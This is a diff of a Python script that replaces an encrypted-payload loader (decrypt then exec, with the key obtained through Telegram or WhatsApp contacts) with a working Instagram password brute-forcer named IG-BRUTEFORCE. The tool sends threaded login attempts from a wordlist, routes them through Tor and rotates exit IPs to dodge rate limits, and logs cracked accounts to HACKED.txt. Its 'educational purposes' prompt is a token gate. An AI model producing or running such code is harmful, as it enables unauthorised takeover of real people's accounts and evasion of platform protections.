@@ -1,93 +1,145 @@
-from cryptography.fernet import Fernet
-import os
-import webbrowser
+from __future__ import absolute_import
+from __future__ import print_function
+import requests, sys, threading, time, os, random, webbrowser
+from random import randint
+from six.moves import input
+from stem import Signal
+from stem.control import Controller
 
-def generate_key():
-    return Fernet.generate_key()
+CheckVersion = str(sys.version)
+import re
+from datetime import datetime
 
-def save_key_to_file(key, key_file):
-    with open(key_file, 'wb') as file:
-        file.write(key)
+## COLORS ###############
+wi="\033[1;37m" #>>White#
+rd="\033[1;31m" #>Red   #
+gr="\033[1;32m" #>Green #
+yl="\033[1;33m" #>Yellow#
+#########################
 
-def load_key_from_file(key_file):
-    with open(key_file, 'rb') as file:
-        return file.read()
+print('''    
+\033[32m
+██╗-██████╗-------██████╗-██████╗-██╗---██╗████████╗███████╗███████╗-██████╗-██████╗--██████╗███████╗
+██║██╔════╝-------██╔══██╗██╔══██╗██║---██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
+██║██║--███╗█████╗██████╔╝██████╔╝██║---██║---██║---█████╗--█████╗--██║---██║██████╔╝██║-----█████╗--
+██║██║---██║╚════╝██╔══██╗██╔══██╗██║---██║---██║---██╔══╝--██╔══╝--██║---██║██╔══██╗██║-----██╔══╝--
+██║╚██████╔╝------██████╔╝██║--██║╚██████╔╝---██║---███████╗██║-----╚██████╔╝██║--██║╚██████╗███████╗
+╚═╝-╚═════╝-------╚═════╝-╚═╝--╚═╝-╚═════╝----╚═╝---╚══════╝╚═╝------╚═════╝-╚═╝--╚═╝-╚═════╝╚══════╝
+\033[35m====================================================================================================\033[35m
+\033[37m#                                                                       Developed by WHITEDH4CKER  #\033[37m
+\033[33m====================================================================================================\033[33m
+\033[34m#                                                    https://github.com/WHITEDH4CKER/IG-BRUTEFORCE #\033[34m      
+\033[39m====================================================================================================\033[39m
+\033[32m''')
 
-def encrypt_file(file_path, key):
-    with open(file_path, 'rb') as file:
-        data = file.read()
+class InstaBrute(object):
+    def __init__(self):
 
-    cipher_suite = Fernet(key)
-    encrypted_data = cipher_suite.encrypt(data)
+        try:
+            user = input('INSTAGRAM USERNAME : ')
+            Combo = input('WORDLIST PATH : ')
+            print(gr+"""
+==================================
+[---]  """ + wi + """ WHITEDH4CKER """ + gr + """        [---]
+==================================
+[---]  """ + wi + """ IG-BRUTEFORCE """ + gr + """       [---]
+==================================
+[---]         """ + yl + """ CONFIG """ + gr + """       [---]
+=================================="""+wi+"""
+[~] """+yl+"""Brute"""+rd+""" IG-ATTACK:  """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
+==================================\n"""+wi)
 
-    with open(file_path + '.enc', 'wb') as file:
-        file.write(encrypted_data)
+        except:
+            print(' The tool was arrested exit ')
+            sys.exit()
 
-def decrypt_file(encrypted_file_path, key):
-    with open(encrypted_file_path, 'rb') as file:
-        encrypted_data = file.read()
+        educational_purpose = input('Are you using this tool for educational purposes? (y/n): ')
+        if educational_purpose.lower() != 'y':
+            print('Sorry, this tool is only for educational purposes.')
+            sys.exit()
 
-    cipher_suite = Fernet(key)
-    decrypted_data = cipher_suite.decrypt(encrypted_data)
+        telegram_member = input('Are you a member of our Telegram group? (y/n): ')
+        if telegram_member.lower() != 'y':
+            print('Please join our Telegram group: https://t.me/WHITEDR00M')
+            webbrowser.open('https://t.me/WHITEDR00M', new=2)  # Open the link in the default browser
+            sys.exit()
 
-    original_file_path = encrypted_file_path[:-4]  # Remove '.enc' extension
-    with open(original_file_path, 'wb') as file:
-        file.write(decrypted_data)
+        tor_use = input('Do you want to use Tor? (y/n): ')
+        if tor_use.lower() == 'y':
+            self.use_tor = True
+            self.start_tor()
+        else:
+            self.use_tor = False
 
-def ask_for_permission():
-    user_response = input("Are you using this tool for educational purposes? (yes/no): ").lower()
-    return user_response == 'yes'
+        with open(Combo, 'r') as x:
+            Combolist = x.read().splitlines()
+        thread = []
+        self.Coutprox = 0
+        for combo in Combolist:
+            password = combo.split(':')[0]
+            t = threading.Thread(target=self.New_Br, args=(user, password))
+            t.start()
+            thread.append(t)
+            time.sleep(0.9)
+        for j in thread:
+            j.join()
 
-def check_telegram_membership():
-    user_response = input("Are you a member of our Telegram group? (yes/no): ").lower()
-    return user_response == 'yes'
+    def start_tor(self):
+        os.system("tor &")
+        time.sleep(5)  # Give Tor some time to start
 
-def ask_for_key():
-    user_response = input("Do you have the encryption key? (yes/no): ").lower()
-    return user_response == 'yes'
+    def change_ip(self):
+        with Controller.from_port(port=9051) as controller:
+            controller.authenticate()
+            controller.signal(Signal.NEWNYM)
+
+    def cls(self):
+        linux = 'clear'
+        windows = 'cls'
+        os.system([linux, windows][os.name == 'nt'])
+
+    def New_Br(self, user, pwd):
+        link = 'https://www.instagram.com/accounts/login/'
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+
+        time_stamp = int(datetime.now().timestamp())
+
+        payload = {
+            'username': user,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_stamp}:{pwd}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+
+        with requests.Session() as s:
+            if self.use_tor:
+                s.proxies = {
+                    'http': 'socks5://127.0.0.1:9050',
+                    'https': 'socks5://127.0.0.1:9050'
+                }
+
+            r = s.get(link)
+            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
+            r = s.post(login_url, data=payload, headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "x-csrftoken": csrf
+            })
+            print(yl+f'{user}:{pwd}\nTRYING===============ATTACKING')
+
+            if 'authenticated": true' in r.text:
+                print(wi+"["+gr+"+"+wi+"] Password [ "+gr+pwd+wi+" ]"+gr+" Is Correct :)")
+                with open('HACKED.txt', 'a') as x:
+                    x.write(user + ':' + pwd + '\n')
+            elif 'two_factor_required' in r.text:
+                print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
+                with open('2FAVerify.txt', 'a') as x:
+                    x.write(user + ':' + pwd + '\n')
+
+            if self.use_tor:
+                self.change_ip()
+                time.sleep(5)  # Wait after changing IP
 
 if __name__ == "__main__":
-    permission_given = ask_for_permission()
-
-    if not permission_given:
-        print("Sorry, this script is only for educational purposes.")
-        exit()
-
-    telegram_member = check_telegram_membership()
-
-    if not telegram_member:
-        print("Please join our Telegram group: https://t.me/WHITEDR00M")
-        webbrowser.open("https://t.me/WHITEDR00M")
-        exit()
-
-    key_present = ask_for_key()
-
-    if not key_present:
-        key_file = 'encryption_key.key'  # Specify the file to store the encryption key
-        encryption_key = generate_key()
-        
-        if ask_for_key():
-            save_key_to_file(encryption_key, key_file)
-    else:
-        key_file = 'encryption_key.key'  # Specify the file to store the encryption key
-
-        if os.path.exists(key_file):
-            # Load the key from the file for decryption
-            encryption_key = load_key_from_file(key_file)
-        else:
-            print("Encryption key file not found.")
-            exit()
-
-    script_path = 'reading.py'  # Replace with the actual path to your project.py file
-    encrypted_script_path = 'reading.py.enc'  # Replace with the actual path to your encrypted script file
-
-    try:
-        decrypt_file(encrypted_script_path, encryption_key)
-        exec(open('reading.py').read())
-    except Exception as e:
-        custom_error_message = "Invalid key or decryption error. Please check if the key is correct."
-        print(custom_error_message)
-        print(f"Original Exception: {str(e)}")
-        
-        if not ask_for_key():
-            webbrowser.open("https://wa.me/17023565387?text=Hello%20%F0%9F%91%8B%20I%20want%20to%20use%20IG-BRUTEFORCE%20tool.%20Can%20I%20have%20the%20key%F0%9F%97%9D%EF%B8%8F")
+    InstaBrute()
